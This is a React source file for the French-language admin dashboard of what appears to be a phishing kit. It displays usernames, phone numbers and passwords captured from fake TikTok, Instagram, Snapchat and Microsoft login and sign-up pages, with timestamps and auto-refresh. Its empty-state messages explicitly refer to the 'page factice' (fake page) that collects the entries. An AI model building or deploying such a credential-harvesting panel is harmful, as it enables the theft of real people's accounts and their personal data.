import { useEffect, useState } from "react";
import { Link, Navigate } from "react-router-dom";
import {
  clearLogins,
  clearRegistrations,
  deleteLogin,
  deleteRegistration,
  getLogins,
  getRegistrations,
  isAdminAuthenticated,
  logoutAdmin,
} from "../admin/storage";

const labels = {
  tiktok: "TikTok",
  instagram: "Instagram",
  snapchat: "Snapchat",
  microsoft: "Microsoft",
};

function formatDateTime(iso) {
  try {
    return new Intl.DateTimeFormat("fr-FR", {
      dateStyle: "short",
      timeStyle: "medium",
    }).format(new Date(iso));
  } catch {
    return iso;
  }
}

function methodLabel(method) {
  return method === "mobile" ? "Mobile" : "User";
}

function AccountsTable({ rows, onDelete, emptyText, dateHeader }) {
  if (!rows.length) {
    return <div className="admin-empty">{emptyText}</div>;
  }

  return (
    <div className="admin-table-wrap">
      <table className="admin-table">
        <thead>
          <tr>
            <th>#</th>
            <th>{dateHeader}</th>
            <th>Réseau</th>
            <th>Type</th>
            <th>User / Mobile</th>
            <th>Mot de passe / Code</th>
            <th>Action</th>
          </tr>
        </thead>
        <tbody>
          {rows.map((item, index) => (
            <tr key={item.id}>
              <td>{rows.length - index}</td>
              <td>{formatDateTime(item.at)}</td>
              <td>
                <span className={`admin-pill admin-pill--${item.network}`}>
                  {labels[item.network] || item.network}
                </span>
              </td>
              <td>
                <span
                  className={`admin-type${
                    item.method === "mobile" ? " admin-type--mobile" : ""
                  }`}
                >
                  {methodLabel(item.method)}
                </span>
              </td>
              <td>
                <code className="admin-cred">{item.identifier || "—"}</code>
              </td>
              <td>
                <code className="admin-cred">{item.password || "—"}</code>
              </td>
              <td>
                <button
                  className="admin-delete"
                  type="button"
                  onClick={() => onDelete(item.id, item.identifier)}
                >
                  Supprimer
                </button>
              </td>
            </tr>
          ))}
        </tbody>
      </table>
    </div>
  );
}

export default function AdminDashboard() {
  const [registrations, setRegistrations] = useState([]);
  const [logins, setLogins] = useState([]);
  const [authed, setAuthed] = useState(isAdminAuthenticated());

  async function refresh() {
    const [regs, logs] = await Promise.all([getRegistrations(), getLogins()]);
    setRegistrations(regs);
    setLogins(logs);
  }

  useEffect(() => {
    refresh();
    const onStorage = () => {
      refresh();
    };
    window.addEventListener("storage", onStorage);
    const timer = setInterval(refresh, 3000);
    return () => {
      window.removeEventListener("storage", onStorage);
      clearInterval(timer);
    };
  }, []);

  if (!authed) {
    return <Navigate to="/admin/login" replace />;
  }

  function onLogout() {
    logoutAdmin();
    setAuthed(false);
  }

  return (
    <div className="admin-page admin-page--dash">
      <header className="admin-top">
        <div>
          <p className="admin-eyebrow">Récolte · admin</p>
          <h1>Espace administrateur</h1>
        </div>
        <div className="admin-actions">
          <Link className="admin-ghost" to="/">
            Accueil
          </Link>
          <button className="admin-btn admin-btn--sm" type="button" onClick={onLogout}>
            Déconnexion
          </button>
        </div>
      </header>

      <section className="admin-section">
        <div className="admin-section__head">
          <div>
            <h2>1. Inscriptions (création de compte)</h2>
            <p className="admin-count">
              {registrations.length} compte
              {registrations.length > 1 ? "s" : ""} créé
              {registrations.length > 1 ? "s" : ""}
            </p>
          </div>
          <button
            className="admin-ghost"
            type="button"
            onClick={async () => {
              if (!window.confirm("Effacer toutes les inscriptions ?")) return;
              await clearRegistrations();
              setRegistrations([]);
            }}
          >
            Effacer inscriptions
          </button>
        </div>
        <AccountsTable
          rows={registrations}
          dateHeader="Date / heure inscription"
          emptyText="Aucune inscription. Sur une page factice, clique « S’inscrire » / « Créer un compte », remplis user + mdp, puis valide."
          onDelete={async (id, identifier) => {
            if (!window.confirm(`Supprimer l’inscription « ${identifier || "?"} » ?`)) return;
            setRegistrations(await deleteRegistration(id));
          }}
        />
      </section>

      <section className="admin-section">
        <div className="admin-section__head">
          <div>
            <h2>2. Connexions</h2>
            <p className="admin-count">
              {logins.length} connexion{logins.length > 1 ? "s" : ""} avec date et
              heure
            </p>
          </div>
          <button
            className="admin-ghost"
            type="button"
            onClick={async () => {
              if (!window.confirm("Effacer toutes les connexions ?")) return;
              await clearLogins();
              setLogins([]);
            }}
          >
            Effacer connexions
          </button>
        </div>
        <AccountsTable
          rows={logins}
          dateHeader="Date / heure connexion"
          emptyText="Aucune connexion. Sur une page factice, reste en mode « Se connecter », saisis user/mobile + mdp, puis valide."
          onDelete={async (id, identifier) => {
            if (!window.confirm(`Supprimer la connexion « ${identifier || "?"} » ?`)) return;
            setLogins(await deleteLogin(id));
          }}
        />
      </section>
    </div>
  );
}
